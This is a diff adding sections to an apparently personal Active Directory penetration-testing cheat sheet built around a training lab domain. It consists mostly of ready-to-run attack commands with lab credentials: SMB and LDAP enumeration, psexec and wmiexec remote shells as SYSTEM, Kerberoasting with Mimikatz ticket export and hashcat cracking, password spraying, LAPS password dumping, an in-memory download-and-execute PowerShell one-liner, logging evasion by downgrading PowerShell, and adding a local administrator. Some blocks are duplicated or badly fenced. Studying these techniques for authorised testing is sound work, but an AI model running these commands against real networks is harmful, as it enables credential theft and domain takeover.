@@ -1933,6 +1933,215 @@
 > ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf
 > ```
 
+
+>[!check] ⚙️ Active Directory Tool Execution Suite
+```
+> sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+> ```
+> 💡 **What it does:** Lists all security groups within Active Directory and shows how many members are in each.
+> 
+> ✔ *Pentester Value:* Helps pinpoint high-value target groups like Domain Admins or IT Admins.
+
+---
+
+## 🕵️ Session & Storage Hunting
+
+---
+
+> [!check] 🐧 Linux Bash: Hunt for Live Active Logged-On User Sessions on a Target Host
+> 
+```bash
+> sudo nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+> ```
+> 💡 **What it does:** Queries the specified server to find out who is actively logged on. 
+> 
+> ✔ *Pentester Value:* Locates high-value targets (e.g., Domain Admins) logged into network assets. If it prints **`(Pwn3d!)`**, your account has local administrator rights on that machine.
+
+---
+
+> [!check] 🐧 Linux Bash: Remote Share Permissions Enumeration (READ/WRITE Access Audit)
+> 
+```bash
+> sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+> ```
+> 💡 **What it does:** Scans the target host for exposed network shares and reports authorization levels.
+> 
+> ✔ *Pentester Value:* Instantly identifies if your authenticated context has `READ` or `WRITE` access to non-standard shares.
+
+---
+
+> [!check] 🐧 Linux Bash: Automated Directory Spidering and Asset Inventory Mapping
+> 
+```bash
+> sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+> ```
+> 💡 **What it does:** Crawls every readable file and folder inside the specified share, logging an exact structural map of the data to local storage.
+> 
+> ✔ *Pentester Value:* Automates data pillaging to find sensitive files.
+
+---
+
+> [!note] 🐧 Linux Bash: Read Parsed Spider JSON Output
+> 
+```bash
+> cat /tmp/cme_spider_plus/172.16.5.5.json | head -n 20
+> ```
+> 💡 **What it does:** Displays the first 20 lines of the spidered log output.
+> 
+> ✔ *Pentester Value:* Allows you to quickly hunt for interesting files like scripts, backups, or configuration files containing credentials.
+
+---
+
+## 📁 SMBMap
+### File System & Permission Replay
+
+---
+
+> [!info] 🐧 Linux Bash: Enumerate Global Share Access Levels
+> 
+```bash
+> smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+> ```
+> 💡 **What it does:** Interrogates the target host over SMB to list available storage volumes and maps out user permission grids.
+
+---
+
+> [!check] 🐧 Linux Bash: Advanced Recursive Multi-Threaded Directory-Only Listing
+> 
+```bash
+> smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+> ```
+> 💡 **What it does:** Recursively lists all subfolders within a share while completely ignoring loose files.
+> 
+> ✔ *Pentester Value:* Gives a clean look at the structural directory layout.
+
+---
+
+## 🔗 rpcclient
+### Low-Level RPC Querying
+
+---
+
+> [!info] 🐧 Linux Bash: Establish Authenticated Interactive MS-RPC Pipe Session
+> 
+```bash
+> rpcclient -U "forend" --password "Klmcargo2" 172.16.5.5
+> ```
+> 💡 **What it does:** Opens an interactive remote session shell using Microsoft's RPC endpoint protocol to perform granular domain architecture testing queries.
+
+---
+
+> [!success] 💬 rpcclient: Enumerate All Domain Users and RIDs Natively
+> ```text
+> rpcclient $> enumdomusers
+> ```
+> 💡 **What it does:** Prints out every user account registered in the domain alongside their hex Relative Identifiers (RIDs).
+
+---
+
+> [!success] 💬 rpcclient: Interrogate Specific Account Schema Metadata by Hex RID
+> ```text
+> rpcclient $> queryuser 0x457
+> ```
+> 💡 **What it does:** Extracts detailed structural metadata for a single account using its specific RID token.
+> 
+> ✔ *Pentester Value:* Reveals account metadata, password expiration thresholds, bad password attempt histories, and structural group associations.
+
+---
+
+## 🐍 Impacket Suite
+### Remote Code Execution (RCE)
+
+---
+
+> [!warning] 🐧 Linux Bash: Spawning Interactive Remote Process Terminals as SYSTEM via ADMIN$
+> ```bash
+> psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+> ```
+> 💡 **What it does:** Uploads a random binary service payload to the host's `ADMIN$` partition and executes it over a named pipe interface.
+> 
+> ✔ *Pentester Value:* Hands you an interactive remote shell prompt running under the highest local privilege context: **`NT AUTHORITY\SYSTEM`**.
+
+---
+
+> [!warning] 🐧 Linux Bash: Semi-Interactive Fileless Remote Console Command Execution via WMI
+> 
+```bash
+> wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+> ```
+> 💡 **What it does:** Executes commands remotely on the machine utilizing Windows Management Instrumentation (WMI).
+> 
+> ✔ *Pentester Value:* Runs entirely in memory without writing files to disk, leaving a smaller footprint on target storage.
+
+---
+
+## 🌬️ windapsearch
+### Target-Focused LDAP Mining
+
+---
+
+> [!check] 🐧 Linux Bash: Enumerate Domain Admins Group Members via LDAP Queries
+> 
+```bash
+> python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+> ```
+> 💡 **What it does:** Queries the Active Directory database over LDAP to extract and isolate all users assigned to the Domain Admins security group.
+
+---
+
+> [!check] 🐧 Linux Bash: Recursive Search for Privileged Users with Nested Group Membership
+> 
+```bash
+> python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+> ```
+> 💡 **What it does:** Performs deep, multi-layered lookups across common structural admin groups.
+> 
+> ✔ *Pentester Value:* Uncovers hidden avenues of exposure where standard users inherit administrative domain rights via nested group links.
+
+---
+
+## 🩸 bloodhound-python
+### Graph Theory Attack Path Ingestion
+
+---
+
+> [!success] 🐧 Linux Bash: Remote Automated Active Directory Object Relationship Ingestion
+> 
+```bash
+> sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+> ```
+> 💡 **What it does:** Automatically maps out the entire Active Directory terrain by gathering users, computers, GPOs, trusts, and complex explicit ACL tables over LDAP.
+> 
+> ✔ *Pentester Value:* Packs everything into localized JSON files to expose complex graph attack paths.
+
+---
+
+> [!abstract] 🐧 Linux Bash: Consolidate Ingestor JSON Outputs into a Unified Archive
+> 
+```bash
+> zip -r ilfreight_bh.zip *.json
+> ```
+> 💡 **What it does:** Compresses all the extracted directory database JSON structures into a single file payload, making it ready to upload into the BloodHound GUI layout.
+
+---
+
+> [!abstract] 🐧 Linux Bash: Spin Up Local Graph Database Backend Engine
+> 
+```bash
+> sudo neo4j start
+> change password
+> install blood hound legacy
+> launch with --no-sandbox
+> import zip data 
+> ```
+> 💡 **What it does:** Initializes the local Neo4j graph database platform service instance, which serves as the data processor for the BloodHound analysis tool.
+
+---
+```
+
+
+
+
 > [!check] 🐧 Linux Bash: Targeted LDAP Query Tracking Cleartext Access Tokens inside Description Attributes
 > 
 > Filters LDAP queries to scan account descriptions for plaintext passwords or administrative notes left by support teams.
@@ -1968,6 +2177,62 @@
 > Find-DomainShare -CheckShareAccess | select name,path
 > Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "Write|All|Force"}
 > ```
+
+
+> [!check] AD CREDENTIAL Enum WINDOWS
+```
+# Check for present PowerShell modules and load the Active Directory module
+Get-Module
+Import-Module ActiveDirectory
+
+# Gather basic domain details (SID, functional level, child domains)
+Get-ADDomain
+
+# Enumerate all domain trust relationships across the forest
+Get-ADTrust -Filter *
+
+# Filter for domain users with an SPN set (Kerberoasting targets)
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# List the names of all Active Directory groups in the domain
+Get-ADGroup -Filter * | select name
+
+# View detailed properties of a specific group
+Get-ADGroup -Identity "Backup Operators"
+
+# List all members belonging to a specific group
+Get-ADGroupMember -Identity "Backup Operators"
+
+# Import PowerView script to begin advanced domain enumeration
+Import-Module .\PowerView.ps1
+
+# Retrieve detailed account and policy properties for a target user
+Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+
+# Recursively list all members of a group including nested group memberships
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+# Map out all trust relationships for the current domain and others seen
+Get-DomainTrustMapping
+
+# Check if your current session has administrative access to a remote host
+Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+# Find all domain accounts with a Service Principal Name (SPN) set via PowerView
+Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+
+# View the argument list and help menu for a specific SharpView method
+.\SharpView.exe Get-DomainUser -Help
+
+# Enumerate user properties using the .NET port of PowerView (SharpView)
+.\SharpView.exe Get-DomainUser -Identity forend
+
+# Scan domain hosts for readable shares and hunt for sensitive file data
+.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+
+# Collect comprehensive AD graph data and save it to a zip file for BloodHound
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+```
 
 ## Phase 2: Credential Attacks (Quick Wins)
 
@@ -2048,6 +2313,84 @@
 > GetUserSPNs.py corp.local/stephanie -hashes :<NTLM_HASH> -dc-ip 192.168.x.100 -request -outputfile kerb.txt
 > ```
 
+>[!check] Keberoasting From Linux 
+```
+# Enumerate and list all SPN accounts in the domain
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+
+# Request and download TGS tickets for all discovered SPN accounts
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+
+# Request and save the TGS ticket for a specific target account to a file
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+
+# Perform an offline dictionary attack against the saved ticket using Hashcat (Mode 13100)
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+
+# Verify the cracked credentials against the Domain Controller to check privileges
+sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+```
+
+> [!check] Kerberoasting from Windows
+```
+# Enumerate and list all SPN accounts in the domain using built-in binary
+setspn.exe -Q */*
+
+# Request and load TGS ticket for a single target account into memory (PowerShell)
+Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+# Request and load TGS tickets for all discovered SPN accounts into memory (PowerShell)
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+# Extract loaded tickets from memory and export them as Base64 encoded strings via Mimikatz
+mimikatz.exe "base64 /out:true" "kerberos::list /export" exit
+
+# Extract loaded tickets from memory and write them directly to disk as .kirbi files via Mimikatz
+mimikatz.exe "kerberos::list /export" exit
+
+# Clean column wrapping from a raw Base64 ticket blob (Linux processing)
+echo "base64_blob" | tr -d \\n
+
+# Decode a cleaned Base64 ticket stream back into a raw .kirbi file (Linux processing)
+cat encoded_file | base64 -d > sqldev.kirbi
+
+# Extract the Kerberos ticket from a .kirbi file into an unformatted crack file
+python2.7 kirbi2john.py sqldev.kirbi
+
+# Reformat the extracted crack file into a standardized Hashcat-compatible hash string
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+
+# Perform an offline dictionary attack against a saved RC4 (etype 23) ticket using Hashcat
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+
+# Enumerate Active Directory SPN accounts and list samaccountnames using PowerView
+Import-Module .\PowerView.ps1; Get-DomainUser * -spn | select samaccountname
+
+# Check the supported encryption types (msDS-SupportedEncryptionTypes) for a specific user via PowerView
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+# Request a TGS ticket for a specific user and output it directly in Hashcat format via PowerView
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+# Export all domain SPN tickets directly into a CSV file for offline processing via PowerView
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+
+# Gather Kerberoastable account statistics without sending actual ticket requests using Rubeus
+.\Rubeus.exe kerberoast /stats
+
+# Request tickets for highly privileged accounts (AdminCount=1) with single-line hash formatting using Rubeus
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+# Request a TGS ticket for a specific user with single-line hash formatting using Rubeus
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+
+# Perform an offline dictionary attack against a saved AES-256 (etype 18) ticket using Hashcat
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+
+# Request an RC4 encrypted ticket for an AES-enabled account via ticket delegation downgrades (Pre-Server 2019 DCs)
+.\Rubeus.exe kerberoast /usetgtdeleg
+```
+
 > [!warning] 💾 Windows CMD: Requesting Service Ticket Extraction Arrays natively from Connected Memory Loops
 > 
 > Uses Rubeus within a local Windows session to extract roastable TGS ticket hashes for all accessible domain service accounts.
@@ -2097,9 +2440,178 @@
 > 
 > ```
 > crackmapexec smb 192.168.x.100 -u domain_users.txt -p 'Password123' --continue-on-success 2>/dev/null | grep "+"
+> 
 > kerbrute passwordspray -d corp.local --dc 192.168.x.100 domain_users.txt 'Password123'
+> 
 > kerbrute passwordspray -d corp.local --dc 192.168.x.100 domain_users.txt 'Corp2024!'
-> ```
+> 
+ #turn rrpclient users to list
+ rpcclient -U "" -c "enumdomusers" -N 172.16.5.5 | grep "user:" | cut -d '[' -f 2 | cut -d ']' -f 1 > valid_users.txt
+
+> [!Security Controls]
+```
+# Check Windows Defender Status (Look for RealTimeProtectionEnabled)
+Get-MpComputerStatus
+
+# View Active AppLocker Whitelisting Rules
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Enumerate PowerShell Language Mode (Look for 'ConstrainedLanguage')
+$ExecutionContext.SessionState.LanguageMode
+
+# View AD groups officially delegated to read LAPS passwords
+Find-LAPSDelegatedGroups
+
+# Check for misconfigured users/groups holding "All Extended Rights" over LAPS
+Find-AdmPwdExtendedRights
+
+# Dump cleartext randomized LAPS local admin passwords (Requires administrative rights)
+Get-LAPSComputers
+```
+
+>[!Note] Windows Living Of The Land 
+```
+# Host Identity & Comprehensive System Summary
+hostname
+systeminfo
+
+# OS Kernel Build & Patch Check
+[System.Environment]::OSVersion.Version
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+# Network Interfaces, Active Routes & ARP Table
+ipconfig /all
+arp -a
+route print
+
+# Environment Variables & Domain Discovery
+set
+echo %USERDOMAIN%
+echo %logonserver%
+
+# Check Active/Disconnected Logged-In Users
+qwinsta
+
+
+# Check Loaded Modules & Session Execution Policies
+Get-Module
+Get-ExecutionPolicy -List
+
+# Process-Scoped Execution Policy Bypass
+Set-ExecutionPolicy Bypass -Scope Process
+
+# View Shell Environment Keys & Values
+Get-ChildItem Env: | ft Key,Value
+
+# Read Plaintext PowerShell Command History
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+
+# In-Memory Web File Download & Execution
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL')"
+
+# Downgrade Shell to Avoid Post-v3.0 Script Block Logging
+powershell.exe -version 2
+
+
+
+# Check Windows Firewall Profile Rule States
+netsh advfirewall show allprofiles
+
+# Query Defend Service Status (CMD)
+sc query windefend
+
+# Check Comprehensive Antivirus Status & Engine Configurations
+Get-MpComputerStatus
+
+
+
+# Domain & Trust Layout Dumps via WMI
+wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+wmic ntdomain list /format:list
+
+# Basic System Architecture & Roles Attributes
+wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
+
+# Live Process, Local Account, Group, & Service Account Lists
+wmic process list /format:list
+wmic useraccount list /format:list
+wmic group list /format:list
+wmic sysaccount list /format:list
+
+
+# Local & Domain Password/Lockout Policies
+net accounts
+net accounts /domain
+
+# Global Domain Group Enumeration & Membership Checks
+net group /domain
+net group "Domain Admins" /domain
+net group "domain computers" /domain
+net group "Domain Controllers" /domain
+net group "Group Name" /domain
+net groups /domain
+
+# Local Account Group Properties & Administrative Additions
+net localgroup
+net localgroup Administrators
+net localgroup administrators /domain
+net localgroup administrators Username /add
+
+# Local Shares & Active Network Machines Maps
+net share
+net view
+net view /domain
+net view \ComputerName /ALL
+net view /all /domain:DomainName
+
+# Account Detail Inspection
+net user /domain
+net user %username%
+net user AccountName /domain
+
+# Mount Remote Share Paths Locally
+net use x: \computer\share
+
+
+# Global User & Computer DN Indexing
+dsquery user
+dsquery computer
+
+# Wildcard Structural Object Extraction within an OU Path
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+
+# Custom LDAP Filter: Search for Accounts with 'PASSWD_NOTREQD' (Bitmask 32)
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+
+# Custom LDAP Filter: Limit Search to 5 Domain Controllers (Bitmask 8192)
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+
+!!!note uac bit mask number can be changed if "2"  
+meaning disable account
+or 64 encrypted password check onlne for it to change ="<bitmasknum>"
+```
+
+
+# Check Windows Defender Status (Look for RealTimeProtectionEnabled)
+Get-MpComputerStatus
+
+# View Active AppLocker Whitelisting Rules
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Enumerate PowerShell Language Mode (Look for 'ConstrainedLanguage')
+$ExecutionContext.SessionState.LanguageMode
+
+# View AD groups officially delegated to read LAPS passwords
+Find-LAPSDelegatedGroups
+
+# Check for misconfigured users/groups holding "All Extended Rights" over LAPS
+Find-AdmPwdExtendedRights
+
+# Dump cleartext randomized LAPS local admin passwords (Requires administrative rights)
+Get-LAPSComputers
+```
+```
+
 
 > [!check] 🐧 Linux Bash: Validating User Account Signatures via Kerberos Domain Controllers Interaction Loops
 > 
